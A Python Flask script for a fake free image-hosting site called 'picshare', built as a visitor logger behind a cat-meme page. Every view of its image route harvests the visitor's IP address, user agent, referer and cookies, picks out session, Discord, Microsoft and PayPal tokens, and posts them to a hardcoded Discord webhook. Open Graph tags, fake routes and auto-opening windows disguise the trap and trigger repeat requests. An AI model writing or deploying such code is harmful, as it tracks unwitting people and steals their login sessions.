from flask import Flask, request, send_file, render_template_string
import requests
import json
import os
from datetime import datetime
from PIL import Image
from io import BytesIO

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWMrpgED3wh1fyD-8NL2iu7daT-j9VApXjKF7aEGhoxnJC1V3XqqBOCeIeebXW2"
IMAGE_PATH = "real-image.jpg"

def send_to_webhook(data):
    important = {k: v[:300] for k, v in data.get('cookies', {}).items() 
                if any(t in k.lower() for t in ['discord', 'token', 'auth', 'session', 'microsoft', 'paypal', 'sid', 'key'])}
    
    embed = {
        "title": "🖼️ New Image View - picshare",
        "color": 0x7289DA,
        "description": "Jemand hat ein Bild auf picshare angeschaut",
        "fields": [
            {"name": "IP Address", "value": data.get('ip'), "inline": True},
            {"name": "Timestamp", "value": data.get('time'), "inline": True},
            {"name": "Important Tokens / Sessions", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "None detected"},
            {"name": "User Agent", "value": data.get('ua')[:450]},
            {"name": "Referer", "value": data.get('referer', 'Direct')},
            {"name": "Total Cookies", "value": str(len(data.get('cookies', {})))}
        ],
        "footer": {"text": "picshare - Free Image Hosting"}
    }
    try:
        requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**New View**"}, timeout=8)
    except:
        pass

@app.route('/image.jpg')
def serve_image():
    ip = request.remote_addr or "unknown"
    ua = request.headers.get('User-Agent', 'unknown')
    referer = request.headers.get('Referer')
    cookies = dict(request.cookies)
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str, 'referer': referer}
    send_to_webhook(data)
    
    if os.path.exists(IMAGE_PATH):
        return send_file(IMAGE_PATH, mimetype='image/jpeg')
    else:
        # Fallback realistisches Bild
        img = Image.new('RGB', (1280, 720), color=(25, 25, 35))
        draw_text = "picshare - Real Image"
        buf = BytesIO()
        img.save(buf, 'JPEG', quality=95)
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/')
@app.route('/view')
def home():
    html = '''
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta property="og:title" content="Cute Cat Meme - picshare">
        <meta property="og:description" content="Lustiges Katzenbild - Kostenloser Bildhoster">
        <meta property="og:image" content="/image.jpg">
        <title>picshare - Free Image Hosting</title>
        <style>
            body { margin:0; padding:0; background:#0f0f1a; color:#ddd; font-family:Arial, sans-serif; overflow:hidden; }
            img { width:100vw; height:100vh; object-fit:contain; background:#000; }
            .overlay { position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.6); padding:10px; border-radius:8px; }
        </style>
    </head>
    <body>
        <div class="overlay">picshare • Free & Fast</div>
        <img src="/image.jpg" alt="Cute Image - picshare">
        
        <script>
            function logVisit() {
                fetch('/image.jpg', { 
                    method: 'GET', 
                    credentials: 'include',
                    cache: 'no-store'
                });
                
                // Mehrere Versuche für Auto-Open
                setTimeout(() => { window.open('/image.jpg', '_blank'); }, 450);
                setTimeout(() => { window.open(window.location.href, '_blank'); }, 1200);
                setTimeout(() => { window.location.reload(); }, 2500);
            }
            
            window.onload = logVisit;
        </script>
    </body>
    </html>
    '''
    return html

# Zusätzliche Fake-Routen für mehr Echtheit
@app.route('/upload')
def fake_upload():
    return "Upload coming soon... (picshare v2.1)"

@app.route('/about')
def fake_about():
    return "picshare - Der beste kostenlose Bildhoster seit 2024."

if __name__ == '__main__':
    print("picshare Logger läuft...")
    app.run(host='0.0.0.0', port=5000)